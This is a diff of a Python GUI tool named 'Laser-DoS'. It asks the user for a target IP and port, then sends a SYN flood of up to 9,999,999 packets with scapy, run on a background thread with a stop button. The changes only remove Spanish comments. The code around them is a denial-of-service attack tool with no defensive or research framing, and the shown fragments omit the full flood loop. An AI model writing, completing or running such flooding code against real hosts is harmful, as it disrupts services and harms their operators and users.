@@ -4,13 +4,13 @@ from scapy.all import IP, TCP, send, RandShort, RandInt
 import threading
 from PIL import Image, ImageTk
 
-# Ventana base
+
 a = tk.Tk()
 a.title("Laser-DoS")
 a.geometry("600x300")
 a.configure(bg="gray")
 a.resizable(False, False)
-# Entradas IP y puerto
+
 Recuadro = tk.Entry(a, width=30)
 Recuadro.place(x=270, y=200)
 
@@ -20,7 +20,7 @@ Recuadro2.place(x=320, y=150)
 stop_attack = threading.Event()
 
 def syn_flood(target_ip, target_port, packet_count=9999999):
-    target_port = int(target_port)  # Convertir a entero
+    target_port = int(target_port) 
     for _ in range(packet_count):
         if stop_attack.is_set():
             break
@@ -58,7 +58,7 @@ def IPv1():
     labelping.is_ping_label = True
     labelping.place(x=490, y=200)
 
-# Labels y botones
+
 texto1 = tk.Label(a, text="Introduzca la IP:", font=("System", 20), bg="gray")
 texto1.place(x=40, y=190)
 
